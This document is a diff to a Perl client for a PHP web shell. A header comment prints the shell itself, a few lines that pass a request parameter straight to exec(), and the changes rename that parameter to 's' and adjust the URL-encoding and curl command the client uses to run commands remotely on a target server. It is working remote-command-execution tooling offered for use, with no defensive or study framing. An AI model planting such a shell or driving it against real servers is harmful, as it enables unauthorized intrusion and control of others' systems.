@@ -18,7 +18,7 @@
 ##########################################################
 # Here is the simple shell to upload to the target	 #
 # <?php                                                  #
-# 	 $cmd = $_REQUEST["shell"];                      #
+# 	 $cmd = $_REQUEST["s"];                          #
 #	 exec($cmd, $out);                               #
 #	 foreach ($out as $line){                        #
 #		 echo "$line <br>";                      #
@@ -31,7 +31,7 @@ use strict;
 our $pwd; #working directory variable 
 our $loc; #web address of web shell
 our $user; #user being used to run commands
-our $curl; #curl+options+$loc+shell
+our $curl; #curl+options+$loc+s
 our $debug; # debug variable
 $SIG{INT} = \&ctrlc; #defines control-C action
 
@@ -193,11 +193,6 @@ sub shell{
 	print "$pwd $user\$ "; #prints shell-like prompt
 	chomp(my $input = <STDIN>);
 	my @parts = split(';',$input);
-	#next four lines URL Encode certain characters, to be replaced by URLEncode function
-	$input =~ s/ /%20/g;
-	$input =~ s/;/%3B/g;
-	#$input =~ s/&/%26/g;
-	#$input =~ s/>/%3E/g;
 	if ($input eq "quit" || $input eq "exit"){
 		exit;
 	}
@@ -216,7 +211,7 @@ sub shell{
         URLEncode($input);
         my $encpwd = $pwd;
         URLEncode($encpwd);
-        if ($debug){print "debug:$curl=%63%64%20$encpwd%3B$input%202%3E%261\n";}
+        if ($debug){print "debug: $curl=%63%64%20$encpwd%3B$input%202%3E%261\n";}
 	foreach my $cmd (@parts){
 		if ($cmd =~ m/cd \S+/){
 			$cmd =~ s/ /%20/g;
@@ -239,7 +234,7 @@ sub shell{
 print "Address of shell: ";
 chomp($loc = <STDIN>);
 #set up $curl variable
-$curl = "curl -s $loc?%73%68%65%6C%6C";
+$curl = "curl -s $loc?%73";
 if (`$curl=echo%20index.php` =~ m/index\.php/){
 	print "Shell found!\n";
 }else{
